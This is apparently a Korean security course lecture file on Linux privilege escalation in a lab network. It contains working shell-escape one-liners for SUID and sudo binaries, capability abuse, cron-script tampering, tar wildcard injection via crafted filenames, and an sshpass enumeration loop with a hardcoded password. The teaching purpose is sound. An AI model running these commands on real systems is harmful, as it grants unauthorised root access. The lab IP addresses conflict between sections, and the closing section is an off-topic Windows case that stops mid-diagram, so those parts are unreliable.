@@ -1,0 +1,1127 @@
+# Week 06: 권한 상승 체인 — Linux Privesc 체인, Capabilities, SUID 체인
+
+## 학습 목표
+- Linux 권한 상승(Privilege Escalation)의 **체계적 열거 방법론**을 이해하고 적용할 수 있다
+- **SUID/SGID** 바이너리를 식별하고 GTFOBins를 참조하여 권한 상승에 활용할 수 있다
+- **Linux Capabilities**의 종류를 이해하고 위험한 Capability 설정을 악용할 수 있다
+- **커널 익스플로잇**(Dirty Pipe, Dirty COW 등)의 원리를 이해하고 적용 조건을 판별할 수 있다
+- cron, systemd, PATH 하이재킹 등 **설정 오류 기반 권한 상승**을 실행할 수 있다
+- **여러 취약점을 체인으로 연결**하여 일반 사용자→root 경로를 구성할 수 있다
+- MITRE ATT&CK Privilege Escalation 전술의 세부 기법을 매핑할 수 있다
+
+## 전제 조건
+- Linux 파일 시스템 권한(rwx, owner/group/other)을 이해하고 있어야 한다
+- 기본 Linux 명령어(find, grep, ps, cat, chmod)를 사용할 수 있어야 한다
+- 프로세스와 서비스(systemd) 개념을 이해하고 있어야 한다
+- 셸 스크립트(bash) 기본 문법을 알고 있어야 한다
+
+## 실습 환경 (6v6 4-tier)
+
+학생 PC 의 `~/.ssh/config` 의 ProxyJump 설정 후 `ssh 6v6-<name>` 으로 접속.
+
+| 컨테이너 | 6v6 IP | 역할 | 접속 |
+|---------|--------|------|------|
+| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh 6v6-bastion` (pw: ccc) |
+| fw (secu) | 10.20.30.1 | 방화벽/HAProxy/Suricata ext | `ssh 6v6-fw` |
+| web | 10.20.32.80 | 권한 상승 대상 (Apache + ModSecurity) | `ssh 6v6-web` |
+| siem | 10.20.32.100 | Wazuh manager + alerts.json | `ssh 6v6-siem` |
+| attacker | 10.20.30.202 | 공격 출발점 (pen-test 도구) | `ssh 6v6-attacker` |
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:35 | Linux 권한 모델 + Privesc 방법론 | 강의 |
+| 0:35-1:10 | SUID/SGID + GTFOBins 실습 | 실습 |
+| 1:10-1:20 | 휴식 | - |
+| 1:20-1:55 | Capabilities + 커널 익스플로잇 | 실습 |
+| 1:55-2:30 | 설정 오류 악용 (cron, PATH, sudo) | 실습 |
+| 2:30-2:40 | 휴식 | - |
+| 2:40-3:10 | 권한 상승 체인 종합 실습 | 실습 |
+| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |
+
+---
+
+# Part 1: Linux 권한 모델과 Privesc 방법론 (35분)
+
+## 1.1 Linux 권한 모델
+
+```mermaid
+graph BT
+    N["nobody<br/>최소 권한"] --> U["일반 사용자<br/>자신의 파일만"]
+    U --> SVC["서비스 계정<br/>www-data, postgres"]
+    SVC --> SUDO["sudo 그룹<br/>임시 root"]
+    SUDO --> ROOT["root (UID 0)<br/>모든 권한"]
+    style N fill:#21262d,color:#e6edf3
+    style U fill:#58a6ff,color:#fff
+    style SVC fill:#d29922,color:#fff
+    style SUDO fill:#f85149,color:#fff
+    style ROOT fill:#f85149,color:#fff
+```
+
+### 권한 상승 벡터 분류
+
+| 카테고리 | 기법 | 예시 | ATT&CK |
+|---------|------|------|--------|
+| **SUID/SGID** | 특수 권한 바이너리 악용 | find, python SUID | T1548.001 |
+| **Capabilities** | 위험한 Capability 악용 | cap_setuid, cap_net_raw | T1548 |
+| **sudo 오설정** | sudo 규칙 악용 | sudo vi → :!bash | T1548.003 |
+| **커널 익스플로잇** | 커널 취약점 | Dirty Pipe, Dirty COW | T1068 |
+| **크론잡** | 루트 크론잡 파일 변조 | 와일드카드 인젝션 | T1053.003 |
+| **PATH 하이재킹** | PATH 환경변수 조작 | 악성 스크립트 우선 실행 | T1574.007 |
+| **NFS** | no_root_squash 악용 | NFS SUID 복사 | T1548 |
+| **Docker** | docker 그룹 악용 | 볼륨 마운트 탈출 | T1611 |
+| **패스워드 파일** | /etc/shadow 읽기 | 해시 크래킹 | T1003.008 |
+| **와일드카드** | tar, rsync 와일드카드 | --checkpoint-action | T1053 |
+
+## 1.2 체계적 열거 방법론
+
+권한 상승의 첫 단계는 **시스템 정보를 체계적으로 열거**하는 것이다.
+
+### 열거 체크리스트
+
+```
+1. 시스템 정보
+   - uname -a (커널 버전)
+   - cat /etc/os-release (OS 버전)
+   - arch (아키텍처)
+
+2. 사용자/그룹
+   - id (현재 사용자)
+   - cat /etc/passwd (전체 사용자)
+   - groups (소속 그룹)
+   - sudo -l (sudo 권한)
+
+3. SUID/SGID
+   - find / -perm -4000 2>/dev/null
+   - find / -perm -2000 2>/dev/null
+
+4. Capabilities
+   - getcap -r / 2>/dev/null
+
+5. 크론잡
+   - cat /etc/crontab
+   - ls -la /etc/cron.d/
+   - crontab -l
+
+6. 프로세스
+   - ps aux (루트 프로세스)
+   - ss -tlnp (리스닝 포트)
+
+7. 파일 권한
+   - 쓰기 가능한 설정 파일
+   - /etc/shadow 읽기 가능 여부
+
+8. 네트워크
+   - ip addr / ifconfig
+   - 내부 서비스 (127.0.0.1)
+```
+
+## 실습 1.1: 자동화 열거 도구
+
+> **실습 목적**: LinPEAS, linEnum 등 자동화 도구를 사용하여 권한 상승 벡터를 체계적으로 열거한다
+>
+> **배우는 것**: 자동화 열거 도구의 사용법과 결과 해석 방법을 배운다
+>
+> **결과 해석**: 빨간색/노란색으로 표시된 항목이 잠재적 권한 상승 벡터이다
+>
+> **실전 활용**: 모의해킹에서 초기 접근 후 가장 먼저 실행하는 도구이다
+>
+> **명령어 해설**: LinPEAS는 셸 스크립트로, 시스템의 모든 권한 상승 벡터를 자동으로 열거한다
+>
+> **트러블슈팅**: 도구가 없으면 수동 열거 명령을 순서대로 실행한다
+
+```bash
+# 수동 열거 (LinPEAS 대체)
+echo "============================================================"
+echo "         Linux Privilege Escalation 열거                      "
+echo "============================================================"
+
+echo ""
+echo "=== 1. 시스템 정보 ==="
+echo "커널: $(uname -r)"
+echo "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)"
+echo "아키텍처: $(arch)"
+
+echo ""
+echo "=== 2. 현재 사용자 ==="
+id
+echo "sudo 권한:"
+sudo -l 2>/dev/null || echo "  sudo 사용 불가"
+
+echo ""
+echo "=== 3. SUID 바이너리 ==="
+find / -perm -4000 -type f 2>/dev/null | head -20
+
+echo ""
+echo "=== 4. Capabilities ==="
+getcap -r / 2>/dev/null | head -10
+
+echo ""
+echo "=== 5. 크론잡 ==="
+cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$"
+ls /etc/cron.d/ 2>/dev/null
+
+echo ""
+echo "=== 6. 루트 프로세스 ==="
+ps aux 2>/dev/null | grep "^root" | grep -v "\[" | head -10
+
+echo ""
+echo "=== 7. 쓰기 가능한 디렉토리 ==="
+find /etc /opt /var -writable -type d 2>/dev/null | head -10
+
+echo ""
+echo "=== 8. 내부 리스닝 포트 ==="
+ss -tlnp 2>/dev/null | grep "127.0.0.1" || netstat -tlnp 2>/dev/null | grep "127.0.0.1"
+```
+
+---
+
+# Part 2: SUID/SGID와 GTFOBins (35분)
+
+## 2.1 SUID/SGID 원리
+
+SUID(Set User ID) 비트가 설정된 바이너리는 **소유자의 권한**으로 실행된다. root 소유의 SUID 바이너리는 일반 사용자도 root 권한으로 실행할 수 있다.
+
+```
+-rwsr-xr-x 1 root root 12345 /usr/bin/passwd
+   ^
+   s = SUID 비트
+
+일반 사용자가 실행해도 root(UID 0) 권한으로 실행됨
+→ /etc/shadow 파일을 수정할 수 있음 (passwd 명령)
+```
+
+### GTFOBins 활용
+
+GTFOBins(https://gtfobins.github.io)는 SUID, sudo, Capabilities 등으로 권한 상승에 악용할 수 있는 바이너리 목록이다.
+
+| 바이너리 | SUID 악용 방법 | 결과 |
+|---------|---------------|------|
+| `find` | `find . -exec /bin/bash -p \;` | root 셸 |
+| `python3` | `python3 -c 'import os; os.execl("/bin/bash","bash","-p")'` | root 셸 |
+| `vim` | `vim -c ':!bash -p'` | root 셸 |
+| `nmap` | `nmap --interactive; !sh` (구버전) | root 셸 |
+| `cp` | `cp /bin/bash /tmp/bash; chmod +s /tmp/bash` | SUID 셸 |
+| `env` | `env /bin/bash -p` | root 셸 |
+| `less` | `less /etc/shadow` → `!bash -p` | root 셸 |
+
+## 실습 2.1: SUID 바이너리 발견 및 악용
+
+> **실습 목적**: SUID 바이너리를 발견하고 GTFOBins를 참조하여 권한 상승을 시도한다
+>
+> **배우는 것**: find 명령으로 SUID 바이너리를 검색하고, 각 바이너리의 악용 가능성을 판단한다
+>
+> **결과 해석**: id 명령의 euid가 0(root)이면 권한 상승에 성공한 것이다
+>
+> **실전 활용**: 초기 접근 후 SUID 검색은 권한 상승의 첫 번째 단계이다
+>
+> **명령어 해설**: find / -perm -4000은 SUID 비트가 설정된 모든 파일을 검색한다
+>
+> **트러블슈팅**: 표준 SUID 바이너리(passwd, su 등)는 악용이 어려우므로 비표준 항목에 집중한다
+
+```bash
+# SUID 바이너리 검색 및 분류
+echo "=== SUID 바이너리 검색 ==="
+echo ""
+
+# 전체 SUID 목록
+SUID_FILES=$(find / -perm -4000 -type f 2>/dev/null)
+echo "$SUID_FILES" | sort
+
+echo ""
+echo "=== SUID 분류 ==="
+
+# 표준 vs 비표준 분류
+STANDARD="/usr/bin/passwd /usr/bin/su /usr/bin/sudo /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/mount /usr/bin/umount /usr/bin/gpasswd /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper"
+
+echo "--- 표준 SUID (보통 안전) ---"
+for f in $SUID_FILES; do
+  if echo "$STANDARD" | grep -qw "$f"; then
+    ls -la "$f" 2>/dev/null
+  fi
+done
+
+echo ""
+echo "--- 비표준 SUID (악용 가능성 검토 필요) ---"
+for f in $SUID_FILES; do
+  if ! echo "$STANDARD" | grep -qw "$f"; then
+    ls -la "$f" 2>/dev/null
+    echo "  → GTFOBins 확인: https://gtfobins.github.io/gtfobins/$(basename $f)/"
+  fi
+done
+```
+
+## 실습 2.2: sudo 규칙 악용
+
+> **실습 목적**: sudo 설정의 약점을 발견하고 권한 상승에 악용한다
+>
+> **배우는 것**: sudo -l 출력 분석, NOPASSWD 규칙 악용, sudo 기반 셸 탈출 기법을 배운다
+>
+> **결과 해석**: sudo를 통해 root 셸을 획득하면 권한 상승 성공이다
+>
+> **실전 활용**: sudo 규칙 분석은 Linux 권한 상승에서 가장 중요한 벡터이다
+>
+> **명령어 해설**: sudo -l은 현재 사용자의 sudo 권한을 표시한다
+>
+> **트러블슈팅**: 비밀번호가 필요하면 다른 벡터를 탐색한다
+
+```bash
+# sudo 규칙 분석
+echo "=== sudo -l 결과 ==="
+echo 1 | sudo -S -l 2>/dev/null
+
+echo ""
+echo "=== sudo 악용 가능한 바이너리 (GTFOBins) ==="
+cat << 'SUDO_ABUSE'
+바이너리별 sudo 악용 방법:
+
+sudo vi / vim:
+  sudo vim -c ':!bash'
+
+sudo less / more:
+  sudo less /etc/shadow
+  !bash
+
+sudo find:
+  sudo find / -exec /bin/bash \;
+
+sudo python / python3:
+  sudo python3 -c 'import os; os.system("/bin/bash")'
+
+sudo perl:
+  sudo perl -e 'exec "/bin/bash";'
+
+sudo ruby:
+  sudo ruby -e 'exec "/bin/bash"'
+
+sudo awk:
+  sudo awk 'BEGIN {system("/bin/bash")}'
+
+sudo nmap (구버전):
+  sudo nmap --interactive
+  !sh
+
+sudo env:
+  sudo env /bin/bash
+
+sudo tar:
+  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+sudo zip:
+  sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
+SUDO_ABUSE
+```
+
+---
+
+# Part 3: Capabilities와 커널 익스플로잇 (35분)
+
+## 3.1 Linux Capabilities
+
+Capabilities는 root 권한을 **세분화된 단위**로 분리한 것이다. 특정 Capability만 부여하면 전체 root 권한 없이 필요한 기능만 사용할 수 있다.
+
+### 위험한 Capabilities
+
+| Capability | 설명 | 악용 방법 |
+|-----------|------|----------|
+| **cap_setuid** | UID 변경 가능 | setuid(0)으로 root 전환 |
+| **cap_setgid** | GID 변경 가능 | root 그룹 접근 |
+| **cap_dac_override** | 파일 권한 무시 | 모든 파일 읽기/쓰기 |
+| **cap_dac_read_search** | 읽기 권한 무시 | /etc/shadow 읽기 |
+| **cap_sys_admin** | 다수 관리 기능 | mount, bpf 등 악용 |
+| **cap_sys_ptrace** | 프로세스 추적 | root 프로세스 디버깅 |
+| **cap_net_raw** | 원시 소켓 생성 | 패킷 캡처/스니핑 |
+| **cap_net_admin** | 네트워크 설정 변경 | 라우팅 테이블 조작 |
+
+## 실습 3.1: Capabilities 열거 및 악용
+
+> **실습 목적**: 위험한 Capability가 설정된 바이너리를 발견하고 권한 상승에 활용한다
+>
+> **배우는 것**: getcap으로 Capability를 열거하고, 각 Capability의 위험성을 판단한다
+>
+> **결과 해석**: cap_setuid가 설정된 바이너리로 UID를 0으로 변경하면 root 권한이다
+>
+> **실전 활용**: Capabilities는 SUID보다 간과되기 쉬워 권한 상승의 좋은 벡터이다
+>
+> **명령어 해설**: getcap -r /은 전체 파일시스템에서 Capability가 설정된 파일을 검색한다
+>
+> **트러블슈팅**: getcap이 없으면 /sbin/getcap 또는 libcap 패키지를 확인한다
+
+```bash
+# Capabilities 열거
+echo "=== Capabilities 열거 ==="
+getcap -r / 2>/dev/null
+
+echo ""
+echo "=== 위험한 Capabilities 분석 ==="
+getcap -r / 2>/dev/null | while read line; do
+  FILE=$(echo "$line" | awk '{print $1}')
+  CAPS=$(echo "$line" | awk '{$1=""; print $0}')
+  RISK=""
+
+  if echo "$CAPS" | grep -q "cap_setuid"; then
+    RISK="[!!] cap_setuid → root 셸 획득 가능"
+  elif echo "$CAPS" | grep -q "cap_dac_override\|cap_dac_read_search"; then
+    RISK="[!!] DAC 우회 → 모든 파일 접근 가능"
+  elif echo "$CAPS" | grep -q "cap_sys_admin"; then
+    RISK="[!!] sys_admin → 다양한 관리 기능 악용"
+  elif echo "$CAPS" | grep -q "cap_sys_ptrace"; then
+    RISK="[!] sys_ptrace → 프로세스 인젝션 가능"
+  elif echo "$CAPS" | grep -q "cap_net_raw"; then
+    RISK="[!] net_raw → 패킷 스니핑 가능"
+  fi
+
+  if [ -n "$RISK" ]; then
+    echo "  $FILE ($CAPS)"
+    echo "    $RISK"
+  fi
+done
+
+echo ""
+echo "=== Capability 악용 예시 ==="
+echo "cap_setuid가 python3에 설정된 경우:"
+echo '  python3 -c "import os; os.setuid(0); os.system(\"/bin/bash\")"'
+echo ""
+echo "cap_dac_read_search가 설정된 경우:"
+echo "  해당 바이너리로 /etc/shadow 읽기 가능"
+```
+
+## 3.2 커널 익스플로잇
+
+### 주요 Linux 커널 익스플로잇
+
+| CVE | 이름 | 커널 버전 | 원리 |
+|-----|------|----------|------|
+| CVE-2022-0847 | **Dirty Pipe** | 5.8~5.16.11 | pipe 버퍼 페이지 캐시 오염 |
+| CVE-2016-5195 | **Dirty COW** | 2.6.22~4.8.3 | Copy-on-Write race condition |
+| CVE-2021-4034 | **PwnKit** | polkit 0.105~0.118 | pkexec argv[0] OOB |
+| CVE-2021-3156 | **Baron Samedit** | sudo 1.8.2~1.8.31p2 | sudo 힙 버퍼 오버플로 |
+| CVE-2022-2588 | **DirtyCred** | 5.8~5.19 | 크레덴셜 교체 |
+| CVE-2023-0386 | **OverlayFS** | 5.11~6.2 | setuid 복사 |
+
+## 실습 3.2: 커널 버전 확인 및 익스플로잇 검색
+
+> **실습 목적**: 현재 커널 버전에 적용 가능한 권한 상승 익스플로잇을 검색한다
+>
+> **배우는 것**: 커널 버전 기반 익스플로잇 검색과 적용 가능성 판단 기법을 배운다
+>
+> **결과 해석**: 커널 버전이 취약 범위에 포함되면 해당 익스플로잇이 적용 가능하다
+>
+> **실전 활용**: 다른 모든 벡터가 실패할 때 마지막 수단으로 커널 익스플로잇을 시도한다
+>
+> **명령어 해설**: uname -r로 커널 버전을 확인하고, searchsploit으로 익스플로잇을 검색한다
+>
+> **트러블슈팅**: 커널 익스플로잇은 시스템 크래시 위험이 있으므로 프로덕션에서 주의한다
+
+```bash
+# 커널 버전 확인
+echo "=== 커널 정보 ==="
+echo "커널 버전: $(uname -r)"
+echo "커널 전체: $(uname -a)"
+
+echo ""
+echo "=== 주요 CVE 적용 가능성 ==="
+KERNEL=$(uname -r | cut -d'.' -f1,2)
+KERNEL_FULL=$(uname -r)
+
+python3 << PYEOF
+import re
+
+kernel = "$KERNEL_FULL"
+major = int(kernel.split('.')[0])
+minor = int(kernel.split('.')[1])
+
+vulns = [
+    ("CVE-2022-0847 (Dirty Pipe)", 5, 8, 5, 16, "pipe 버퍼 오염 → 파일 덮어쓰기"),
+    ("CVE-2016-5195 (Dirty COW)", 2, 6, 4, 8, "COW race condition"),
+    ("CVE-2021-4034 (PwnKit)", 0, 0, 99, 99, "polkit pkexec (커널 무관, polkit 버전 확인)"),
+    ("CVE-2021-3156 (Baron Samedit)", 0, 0, 99, 99, "sudo 버전 확인 필요"),
+    ("CVE-2022-2588 (DirtyCred)", 5, 8, 5, 19, "크레덴셜 교체"),
+    ("CVE-2023-0386 (OverlayFS)", 5, 11, 6, 2, "setuid 복사"),
+]
+
+print(f"현재 커널: {kernel} (major={major}, minor={minor})")
+print()
+
+for name, min_maj, min_min, max_maj, max_min, desc in vulns:
+    if min_maj == 0 and max_maj == 99:
+        status = "[?] 별도 확인 필요"
+    elif (major > min_maj or (major == min_maj and minor >= min_min)) and \
+         (major < max_maj or (major == max_maj and minor <= max_min)):
+        status = "[!!] 잠재적 취약"
+    else:
+        status = "[OK] 영향 없음"
+    print(f"  {status} {name}")
+    print(f"    범위: {min_maj}.{min_min}~{max_maj}.{max_min}, 원리: {desc}")
+    print()
+PYEOF
+
+# polkit 버전 확인 (PwnKit)
+echo "=== polkit 버전 ==="
+pkexec --version 2>/dev/null || echo "pkexec 없음"
+
+# sudo 버전 확인 (Baron Samedit)
+echo "=== sudo 버전 ==="
+sudo --version 2>/dev/null | head -1
+```
+
+---
+
+# Part 4: 설정 오류 악용과 권한 상승 체인 (35분)
+
+## 4.1 크론잡 악용
+
+root 크론잡이 **일반 사용자가 수정할 수 있는 스크립트를 실행**하면 권한 상승이 가능하다.
+
+### 크론잡 악용 시나리오
+
+```
+[취약한 설정]
+# /etc/crontab
+* * * * * root /opt/scripts/backup.sh
+
+# /opt/scripts/backup.sh 가 일반 사용자에게 쓰기 가능
+-rwxrwxrwx 1 root root 100 /opt/scripts/backup.sh
+
+[공격]
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
+# 1분 후 root가 실행 → /tmp/rootbash에 SUID 설정됨
+/tmp/rootbash -p  # root 셸!
+```
+
+### 와일드카드 인젝션
+
+```bash
+# 취약한 크론잡: tar에 와일드카드 사용
+* * * * * root cd /opt/backup && tar czf /tmp/backup.tar.gz *
+
+# 공격: 파일명을 tar 옵션으로 생성
+echo "" > /opt/backup/"--checkpoint=1"
+echo "" > /opt/backup/"--checkpoint-action=exec=sh privesc.sh"
+echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /opt/backup/privesc.sh
+# tar가 * 확장 시 파일명이 옵션으로 해석됨!
+```
+
+## 실습 4.1: 크론잡과 PATH 하이재킹
+
+> **실습 목적**: 크론잡 악용과 PATH 하이재킹으로 권한 상승을 실습한다
+>
+> **배우는 것**: 크론잡 분석, 쓰기 가능 스크립트 발견, PATH 우선순위 조작 기법을 배운다
+>
+> **결과 해석**: root 크론잡이 악성 스크립트를 실행하면 권한 상승 성공이다
+>
+> **실전 활용**: 크론잡은 간과되기 쉬운 권한 상승 벡터로, 항상 열거해야 한다
+>
+> **명령어 해설**: /etc/crontab과 /etc/cron.d/를 분석하고 쓰기 가능 여부를 확인한다
+>
+> **트러블슈팅**: 크론 서비스가 실행 중인지 systemctl status cron으로 확인한다
+
+```bash
+# 크론잡 분석
+echo "=== 크론잡 열거 ==="
+echo "--- /etc/crontab ---"
+cat /etc/crontab 2>/dev/null
+
+echo ""
+echo "--- /etc/cron.d/ ---"
+ls -la /etc/cron.d/ 2>/dev/null
+for f in /etc/cron.d/*; do
+  echo "  [$f]"
+  cat "$f" 2>/dev/null | grep -v "^#" | grep -v "^$"
+done
+
+echo ""
+echo "--- 사용자 크론잡 ---"
+crontab -l 2>/dev/null || echo "현재 사용자 크론잡 없음"
+
+echo ""
+echo "=== 쓰기 가능한 크론 스크립트 검색 ==="
+# 크론잡에서 참조하는 스크립트 파일의 쓰기 권한 확인
+cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" | awk '{print $NF}' | while read script; do
+  if [ -f "$script" ] && [ -w "$script" ]; then
+    echo "  [!!] 쓰기 가능: $script"
+    ls -la "$script"
+  fi
+done
+
+echo ""
+echo "=== PATH 하이재킹 분석 ==="
+echo "--- 크론잡 PATH ---"
+grep "^PATH" /etc/crontab 2>/dev/null
+echo ""
+echo "--- PATH에서 쓰기 가능한 디렉토리 ---"
+IFS=':' read -ra PATHS <<< "$PATH"
+for p in "${PATHS[@]}"; do
+  if [ -w "$p" ]; then
+    echo "  [!!] 쓰기 가능: $p"
+  fi
+done
+```
+
+## 실습 4.2: 권한 상승 체인 — 종합 시나리오
+
+> **실습 목적**: 여러 권한 상승 벡터를 체인으로 연결하여 일반 사용자→root 경로를 구성한다
+>
+> **배우는 것**: 단일 벡터가 부족할 때 여러 벡터를 조합하는 권한 상승 체인 구성법을 배운다
+>
+> **결과 해석**: 최종적으로 root 셸(euid=0)을 획득하면 체인이 성공한 것이다
+>
+> **실전 활용**: 실제 모의해킹에서 단일 벡터로는 불가능한 권한 상승을 체인으로 달성한다
+>
+> **명령어 해설**: 각 단계의 결과가 다음 단계의 입력이 되는 체인 구조이다
+>
+> **트러블슈팅**: 체인의 특정 단계가 실패하면 대안 벡터를 탐색한다
+
+```bash
+echo "============================================================"
+echo "       권한 상승 체인 종합 시나리오                            "
+echo "============================================================"
+
+echo ""
+echo "[Phase 1] 현재 상태 확인"
+echo "  사용자: $(whoami)"
+echo "  UID: $(id -u)"
+echo "  그룹: $(groups)"
+
+echo ""
+echo "[Phase 2] 모든 벡터 열거"
+echo "--- SUID ---"
+SUID_COUNT=$(find / -perm -4000 -type f 2>/dev/null | wc -l)
+echo "  SUID 바이너리: ${SUID_COUNT}개"
+
+echo "--- Capabilities ---"
+CAP_COUNT=$(getcap -r / 2>/dev/null | wc -l)
+echo "  Capability 바이너리: ${CAP_COUNT}개"
+
+echo "--- sudo ---"
+echo 1 | sudo -S -l 2>/dev/null | grep -c "NOPASSWD\|ALL" || echo "  0"
+echo "  위 개수의 sudo 규칙 발견"
+
+echo "--- 크론잡 ---"
+CRON_COUNT=$(cat /etc/crontab 2>/dev/null | grep -cv "^#\|^$\|^PATH\|^SHELL\|^MAILTO")
+echo "  크론잡: ${CRON_COUNT}개"
+
+echo "--- 커널 ---"
+echo "  커널: $(uname -r)"
+
+echo ""
+echo "[Phase 3] 권한 상승 체인 구성"
+cat << 'CHAIN'
+가능한 체인 시나리오:
+
+체인 A: SUID → root 셸
+  1. find / -perm -4000 → 비표준 SUID 발견 (예: python3)
+  2. python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
+  3. root 셸 획득
+
+체인 B: sudo → SUID 생성 → root 셸
+  1. sudo -l → sudo find 사용 가능
+  2. sudo find / -exec cp /bin/bash /tmp/rootbash \;
+  3. sudo find / -exec chmod +s /tmp/rootbash \;
+  4. /tmp/rootbash -p → root 셸
+
+체인 C: 쓰기 가능 파일 → 크론잡 → root
+  1. 크론잡 분석 → /opt/scripts/backup.sh 쓰기 가능
+  2. 리버스 셸 삽입
+  3. 크론 실행 대기 → root 셸
+
+체인 D: Capability → 파일 읽기 → 패스워드 → su
+  1. cap_dac_read_search 발견 → /etc/shadow 읽기
+  2. 해시 크래킹 → root 비밀번호
+  3. su root → root 셸
+
+체인 E: 커널 익스플로잇
+  1. uname -r → 취약 커널 버전
+  2. 해당 CVE 익스플로잇 컴파일
+  3. 실행 → root 셸
+CHAIN
+
+echo ""
+echo "[Phase 4] 실제 시도"
+# sudo를 이용한 권한 상승 시도
+echo "--- sudo를 통한 root 접근 ---"
+echo 1 | sudo -S id 2>/dev/null && echo "[+] sudo로 root 접근 성공" || echo "[-] sudo 실패"
+
+echo ""
+echo "============================================================"
+echo "  각 서버에서 다른 체인이 가능할 수 있음 - 모두 시도하라       "
+echo "============================================================"
+```
+
+## 실습 4.3: 원격 서버 권한 상승 열거
+
+> **실습 목적**: 실습 환경의 각 서버에서 권한 상승 벡터를 원격으로 열거한다
+>
+> **배우는 것**: SSH를 통한 원격 시스템의 권한 상승 벡터 열거 기법을 배운다
+>
+> **결과 해석**: 각 서버별로 발견된 벡터를 비교하여 가장 효과적인 경로를 선택한다
+>
+> **실전 활용**: 내부 피봇 후 새로운 호스트에서의 권한 상승 열거에 활용한다
+>
+> **명령어 해설**: SSH로 원격 서버에 열거 명령을 전달한다
+>
+> **트러블슈팅**: SSH 접근이 안 되면 다른 접근 경로(웹셸 등)를 활용한다
+
+```bash
+# 각 서버 원격 열거
+for SERVER in "ccc@10.20.30.80" "ccc@10.20.30.1" "ccc@10.20.30.100"; do
+  NAME=$(echo "$SERVER" | cut -d'@' -f1)
+  IP=$(echo "$SERVER" | cut -d'@' -f2)
+
+  echo "============================================"
+  echo "  서버: $NAME ($IP)"
+  echo "============================================"
+
+  sshpass -p1 ssh -o StrictHostKeyChecking=no "$SERVER" "
+    echo '--- 사용자 ---'
+    id
+    echo '--- SUID (비표준) ---'
+    find /usr/local -perm -4000 -type f 2>/dev/null
+    find /opt -perm -4000 -type f 2>/dev/null
+    find /home -perm -4000 -type f 2>/dev/null
+    echo '--- Capabilities ---'
+    getcap -r /usr 2>/dev/null
+    echo '--- sudo ---'
+    echo 1 | sudo -S -l 2>/dev/null | tail -5
+    echo '--- 커널 ---'
+    uname -r
+  " 2>/dev/null || echo "  접속 실패"
+  echo ""
+done
+```
+
+---
+
+## 검증 체크리스트
+
+| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
+|------|---------|----------|----------|
+| 1 | SUID 열거 | find -perm -4000 | 전체 목록 출력 |
+| 2 | GTFOBins 활용 | 바이너리 악용 | 셸 탈출 방법 제시 |
+| 3 | sudo 분석 | sudo -l | 악용 가능 규칙 식별 |
+| 4 | Capabilities 열거 | getcap -r / | 위험 Capability 식별 |
+| 5 | 커널 버전 확인 | uname -r | 취약 여부 판단 |
+| 6 | 크론잡 분석 | /etc/crontab | 쓰기 가능 스크립트 |
+| 7 | PATH 하이재킹 | PATH 분석 | 쓰기 가능 디렉토리 |
+| 8 | 와일드카드 인젝션 | tar 악용 | 원리 설명 |
+| 9 | 원격 열거 | SSH 명령 | 3개 서버 열거 |
+| 10 | 체인 구성 | 종합 시나리오 | 최소 3개 체인 설계 |
+
+---
+
+## 과제
+
+### 과제 1: Privesc 자동화 스크립트 (개인)
+LinPEAS의 주요 검사 항목(SUID, Capabilities, sudo, 크론잡, PATH)을 구현하는 간이 셸 스크립트를 작성하라. 각 항목의 위험도를 색상이나 기호로 표시할 것.
+
+### 과제 2: 서버별 Privesc 보고서 (팀)
+실습 환경의 4개 서버(bastion, secu, web, siem)에서 각각 권한 상승 열거를 수행하고, 서버별 발견된 벡터와 추천 공격 경로를 정리한 보고서를 작성하라.
+
+### 과제 3: 권한 상승 방어 가이드 (팀)
+이번 주 학습한 모든 권한 상승 벡터에 대한 방어 가이드를 작성하라. SUID 최소화, Capability 감사, sudo 강화, 크론잡 보안 등을 포함할 것.
+
+---
+
+## 📂 실습 참조 파일 가이드
+
+> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+
+### LinPEAS / linux-exploit-suggester
+> **역할:** Linux 권한 상승 벡터 자동 열거  
+> **실행 위치:** `침투 대상 호스트 (저권한 셸)`  
+> **접속/호출:** `./linpeas.sh`, `./les.sh`
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
+|------|------|
+| `/tmp/linpeas.sh` | 업로드 위치 (실행권한 +x) |
+| `/dev/shm/` | tmpfs — 로그 잔존이 적어 자주 사용 |
+
+**핵심 설정·키**
+
+- `-a` — 심층 분석(파일 내용까지 스캔)
+- `-s` — 빠른 모드
+
+**로그·확인 명령**
+
+- `/tmp/linpeas.out` — 결과 저장
+
+**UI / CLI 요점**
+
+- 결과의 빨강/노랑 highlights — Critical/Probable 권한상승 벡터
+- SUID·sudo·cron·capabilities·kernel 섹션 — 체크리스트 핵심
+
+> **해석 팁.** 결과는 **가능성 높은 순**으로 정렬되지만, 실제 exploit은 커널·배포판 버전 의존. `uname -a`/`/etc/os-release`로 대상 확정 후 공개 PoC 선택.
+
+---
+
+## 실제 사례 (WitFoo Precinct 6 — Windows Privesc 심화)
+
+> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
+> 본 lecture *Windows Privesc 심화* 학습 항목 매칭.
+
+### Windows Privesc 심화 의 dataset 흔적 — "Token + UAC bypass"
+
+dataset 의 정상 운영에서 *Token + UAC bypass* 신호의 baseline 을 알아두면, *Windows Privesc 심화* 시도 시 발생하는 anomaly 를 정량으로 탐지할 수 있다. 핵심 정량 지표는 — 4672 + 4673.
+
+```mermaid
+graph LR
+    SCENE["Windows Privesc 심화 시나리오"]
+    TRACE["dataset 흔적<br/>Token + UAC bypass"]
+    DETECT["탐지 / 분석"]
+
+    SCENE --> TRACE
+    TRACE --> DETECT
+
